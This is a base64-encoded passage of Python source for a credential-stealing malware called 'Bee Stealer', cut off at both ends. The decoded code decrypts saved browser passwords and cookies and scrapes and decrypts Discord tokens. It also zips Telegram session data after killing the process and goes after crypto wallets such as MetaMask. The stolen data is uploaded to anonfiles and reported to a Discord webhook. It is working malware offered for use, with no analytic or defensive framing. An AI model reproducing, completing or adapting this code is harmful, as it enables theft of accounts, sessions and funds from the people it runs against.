IF0sCiAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzZXJuYW1lfSN7aGFzaHRhZ30gKHtpZGR9KSIsCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiBmIntwZnB9IgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogIkJlZSBTdGVhbGVyIHwgQXJ4aWZ5IzAwMDEiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAidGh1bWJuYWlsIjogewogICAgICAgICAgICAgICAgInVybCI6IGYie3BmcH0iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLAogICAgICAgICJ1c2VybmFtZSI6ICJCZWUgU3RlYWxlciIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICB9CiAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCmRlZiBSZWZvcm1hdChsaXN0dCk6CiAgICBlID0gcmUuZmluZGFsbCgiKFx3K1thLXpdKSIsbGlzdHQpCiAgICB3aGlsZSAiaHR0cHMiIGluIGU6IGUucmVtb3ZlKCJodHRwcyIpCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikKICAgIHdoaWxlICJuZXQiIGluIGU6IGUucmVtb3ZlKCJuZXQiKQogICAgcmV0dXJuIGxpc3Qoc2V0KGUpKQoKZGVmIHVwbG9hZChuYW1lLCBsaW5rKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KCiAgICBpZiBuYW1lID09ICJ3cGNvb2siOgogICAgICAgIHJiID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gY29va2lXb3JkcykKICAgICAgICBpZiBsZW4ocmIpID4gMTAwMDogCiAgICAgICAgICAgIHJycnJyID0gUmVmb3JtYXQoc3RyKGNvb2tpV29yZHMpKQogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycnJyKQogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZ2xvYmFsSW5mbygpLAogICAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJCZWUgPiBDb29raWVzIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiKipGb3VuZCoqOlxue3JifVxuXG4qKkRhdGE6Kipcbjpjb29raWU6IOKAoiAqKntDb29raUNvdW50fSoqIENvb2tpZXMgRm91bmRcbjpsaW5rOiDigKIgW0JlZUNvb2tpZXMudHh0XSh7bGlua30pIiwKICAgICAgICAgICAgICAgICAgICAiY29sb3IiOiAzOTQsCiAgICAgICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiQmVlIFN0ZWFsZXIgfCBBcnhpZnkjMDAwMSIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgInVzZXJuYW1lIjogIkJlZSBTdGVhbGVyIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgoKICAgIGlmIG5hbWUgPT0gIndwcGFzc3ciOgogICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcGFzd1dvcmRzKQogICAgICAgIGlmIGxlbihyYSkgPiAxMDAwOiAKICAgICAgICAgICAgcnJyID0gUmVmb3JtYXQoc3RyKHBhc3dXb3JkcykpCiAgICAgICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcnJyKQoKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAidGl0bGUiOiAiQmVlID4gUGFzc3dvcmQgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiIqKkZvdW5kKio6XG57cmF9XG5cbioqRGF0YToqKlxu8J+UkSDigKIgKip7UGFzc3dDb3VudH0qKiBQYXNzd29yZHMgRm91bmRcbjpsaW5rOiDigKIgW0JlZVBhc3N3b3Jkcy50eHRdKHtsaW5rfSkiLAogICAgICAgICAgICAgICAgICAgICJjb2xvciI6IDM5NCwKICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJCZWUgU3RlYWxlciB8IEFyeGlmeSMwMDAxIiwKICAgICAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAidXNlcm5hbWUiOiAiQmVlIFN0ZWFsZXIiLAogICAgICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIiwKICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICAgICAgfQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuCgogICAgaWYgbmFtZSA9PSAia2l3aSI6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgImNvbnRlbnQiOiBnbG9iYWxJbmZvKCksCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAiY29sb3IiOiAzOTQsCiAgICAgICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogbGluawogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIkJlZSA+IEZpbGUgU3RlYWxlciIKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkJlZSBTdGVhbGVyIHwgQXJ4aWZ5IzAwMDEiLAogICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAidXNlcm5hbWUiOiAiQmVlIFN0ZWFsZXIiLAogICAgICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIiwKICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICAgICAgfQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuCgoKCiMgZGVmIHVwbG9hZChuYW1lLCB0az0nJyk6CiMgICAgIGhlYWRlcnMgPSB7CiMgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAojICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiMgICAgIH0KCiMgICAgICMgciA9IHJlcXVlc3RzLnBvc3QoaG9vaywgZmlsZXM9ZmlsZXMpCiMgICAgIExvYWRSZXF1ZXN0cygiUE9TVCIsIGhvb2ssIGZpbGVzPWZpbGVzKQoKZGVmIHdyaXRlZm9yZmlsZShkYXRhLCBuYW1lKToKICAgIHBhdGggPSBvcy5nZXRlbnYoIlRFTVAiKSArIGYiXHdwe25hbWV9LnR4dCIKICAgIHdpdGggb3BlbihwYXRoLCBtb2RlPSd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoKICAgICAgICBmLndyaXRlKGYiPC0tVzRTUCBTVEVBTEVSIE9OIFRPUC0tPlxuXG4iKQogICAgICAgIGZvciBsaW5lIGluIGRhdGE6CiAgICAgICAgICAgIGlmIGxpbmVbMF0gIT0gJyc6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYie2xpbmV9XG4iKQoKVG9rZW5zID0gJycKZGVmIGdldFRva2VuKHBhdGgsIGFyZyk6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybgoKICAgIHBhdGggKz0gYXJnCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoIi5sb2ciKSBvciBmaWxlLmVuZHN3aXRoKCIubGRiIikgICA6CiAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmIntwYXRofVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI1LDExMH0iLCByIm1mYVwuW1x3LV17ODAsOTV9Iik6CiAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwocmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICBnbG9iYWwgVG9rZW5zCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoZWNrVG9rZW4odG9rZW4pOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHRva2VuIGluIFRva2VuczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHByaW50KHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbG9hZFRva2VuKHRva2VuLCBwYXRoKQoKUGFzc3cgPSBbXQpkZWYgZ2V0UGFzc3cocGF0aCwgYXJnKToKICAgIGdsb2JhbCBQYXNzdywgUGFzc3dDb3VudAogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL0xvZ2luIERhdGEiCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybgoKICAgIHRlbXBmb2xkID0gdGVtcCArICJ3cCIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgoKICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICBjb25uID0gc3FsX2Nvbm5lY3QodGVtcGZvbGQpCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2luczsiKQogICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29ubi5jbG9zZSgpCiAgICBvcy5yZW1vdmUodGVtcGZvbGQpCgogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgogICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKCiAgICBmb3Igcm93IGluIGRhdGE6IAogICAgICAgIGlmIHJvd1swXSAhPSAnJzoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gcGFzd1dvcmRzOiBwYXN3V29yZHMuYXBwZW5kKG9sZCkKICAgICAgICAgICAgUGFzc3cuYXBwZW5kKGYiPT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuVVJMOiB7cm93WzBdfVxuVXNlcm5hbWU6IHtyb3dbMV19XG5QYXNzd29yZDoge0RlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpfVxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCiAgICAgICAgICAgIFBhc3N3Q291bnQgKz0gMQogICAgd3JpdGVmb3JmaWxlKFBhc3N3LCAncGFzc3cnKQoKQ29va2llcyA9IFtdICAgIApkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgQ29va2llcywgQ29va2lDb3VudAogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KICAgIAogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KICAgIAogICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCiAgICAKICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICBjb25uID0gc3FsX2Nvbm5lY3QodGVtcGZvbGQpCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIAogICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKCiAgICBmb3Igcm93IGluIGRhdGE6IAogICAgICAgIGlmIHJvd1swXSAhPSAnJzoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gY29va2lXb3JkczogY29va2lXb3Jkcy5hcHBlbmQob2xkKQogICAgICAgICAgICBDb29raWVzLmFwcGVuZChmIj09PT09PT09PT09PT09PT09PT09PT09PT09PT1cbkhvc3Q6IHtyb3dbMF19XG5OYW1lOiB7cm93WzFdfVxuVmFsdWU6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX1cbj09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKQogICAgICAgICAgICBDb29raUNvdW50ICs9IDEKICAgIHdyaXRlZm9yZmlsZShDb29raWVzLCAnY29vaycpCgpkZWYgR2V0RGlzY29yZChwYXRoLCBhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGYie3BhdGh9L0xvY2FsIFN0YXRlIik6IHJldHVybgoKICAgIHBhdGhDID0gcGF0aCArIGFyZwoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCiAgICAjIHByaW50KHBhdGgsIG1hc3Rlcl9rZXkpCiAgICAKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgICMgcHJpbnQocGF0aCwgZmlsZSkKICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aEN9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyImRRdzR3OVdnWGNROlteLipcWycoLiopJ1xdLiokXVteXCJdKiIsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMKICAgICAgICAgICAgICAgICAgICB0b2tlbkRlY29kZWQgPSBEZWNyeXB0VmFsdWUoYjY0ZGVjb2RlKHRva2VuLnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIG1hc3Rlcl9rZXkpCiAgICAgICAgICAgICAgICAgICAgaWYgY2hlY2tUb2tlbih0b2tlbkRlY29kZWQpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW5EZWNvZGVkIGluIFRva2VuczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb2tlbnMgKz0gdG9rZW5EZWNvZGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHdyaXRlZm9yZmlsZShUb2tlbnMsICd0b2tlbnMnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsb2FkVG9rZW4odG9rZW5EZWNvZGVkLCBwYXRoKQoKZGVmIEdhdGhlclppcHMocGF0aHMxLCBwYXRoczIsIHBhdGhzMyk6CiAgICB0aHR0aHQgPSBbXQogICAgZm9yIHBhdHQgaW4gcGF0aHMxOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIHRodHRodC5hcHBlbmQoYSkKCiAgICBmb3IgcGF0dCBpbiBwYXRoczI6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRoaW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFsyXSwgcGF0dFsxXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgdGh0dGh0LmFwcGVuZChhKQogICAgCiAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGVsZWdyYW0sIGFyZ3M9W3BhdGhzM1swXSwgcGF0aHMzWzJdLCBwYXRoczNbMV1dKQogICAgYS5zdGFydCgpCiAgICB0aHR0aHQuYXBwZW5kKGEpCgogICAgZm9yIHRocmVhZCBpbiB0aHR0aHQ6IAogICAgICAgIHRocmVhZC5qb2luKCkKICAgIGdsb2JhbCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwCiAgICAgICAgIyBwcmludChXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwKQoKICAgIHdhbCwgZ2EsIG90ID0gIiIsJycsJycKICAgIGlmIG5vdCBsZW4oV2FsbGV0c1ppcCkgPT0gMDoKICAgICAgICB3YWwgPSAiOmNvaW46ICDigKIgIFdhbGxldHNcbiIKICAgICAgICBmb3IgaSBpbiBXYWxsZXRzWmlwOgogICAgICAgICAgICB3YWwgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIgogICAgaWYgbm90IGxlbihXYWxsZXRzWmlwKSA9PSAwOgogICAgICAgIGdhID0gIjp2aWRlb19nYW1lOiAg4oCiICBHYW1pbmc6XG4iCiAgICAgICAgZm9yIGkgaW4gR2FtaW5nWmlwOgogICAgICAgICAgICBnYSArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iCiAgICBpZiBub3QgbGVuKE90aGVyWmlwKSA9PSAwOgogICAgICAgIG90ID0gIjp0aWNrZXRzOiAg4oCiICBBcHBzXG4iCiAgICAgICAgZm9yIGkgaW4gT3RoZXJaaXA6CiAgICAgICAgICAgIG90ICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiIgICAgICAgICAgCiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICJ0aXRsZSI6ICJCZWUgPiBaaXBzIiwKICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiJ7d2FsfVxue2dhfVxue290fSIsCiAgICAgICAgICAgICJjb2xvciI6IDEzOSwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogIkJlZSBTdGVhbGVyIHwgQXJ4aWZ5IzAwMDEiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciCiAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIF0sCiAgICAgICAgInVzZXJuYW1lIjogIkJlZSBTdGVhbGVyIiwKICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIiwKICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgfQogICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCgpkZWYgWmlwVGVsZWdyYW0ocGF0aCwgYXJnLCBwcm9jYyk6CiAgICBnbG9iYWwgT3RoZXJaaXAKICAgIHBhdGhDID0gcGF0aAogICAgbmFtZSA9IGFyZwogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGhDKTogcmV0dXJuCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YgPm51bCAyPiYxIiwgc2hlbGw9VHJ1ZSkKCiAgICB6ZiA9IFppcEZpbGUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiLCAidyIpCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGUgYW5kIG5vdCAidGR1bW15IiBpbiBmaWxlIGFuZCBub3QgInVzZXJfZGF0YSIgaW4gZmlsZSBhbmQgbm90ICJ3ZWJ2aWV3IiBpbiBmaWxlOiAKICAgICAgICAgICAgemYud3JpdGUocGF0aEMgKyAiLyIgKyBmaWxlKQogICAgemYuY2xvc2UoKQoKICAgIGxuaWsgPSB1cGxvYWRUb0Fub25maWxlcyhmJ3twYXRoQ30ve25hbWV9LnppcCcpCiMgICAgIGxuaWsgPSAiaHR0cHM6Ly9nb29nbGUuY29tIgogICAgb3MucmVtb3ZlKGYie3BhdGhDfS97bmFtZX0uemlwIikKICAgIE90aGVyWmlwLmFwcGVuZChbYXJnLCBsbmlrXSkKCmRlZiBaaXBUaGluZ3MocGF0aCwgYXJnLCBwcm9jYyk6CiAgICBwYXRoQyA9IHBhdGgKICAgIG5hbWUgPSBhcmcKICAgIGdsb2JhbCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwCiAgICAjIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIsIHNoZWxsPVRydWUpCiAgICAjIG9zLnN5c3RlbShmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mIikKCiAgICBpZiAibmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iIGluIGFyZzoKICAgICAgICBicm93c2VyID0gcGF0aC5zcGxpdCgiXFwiKVs0XS5zcGxpdCgiLyIpWzFdLnJlcGxhY2UoJyAnLCAnJykKICAgICAgICBuYW1lID0gZiJNZXRhb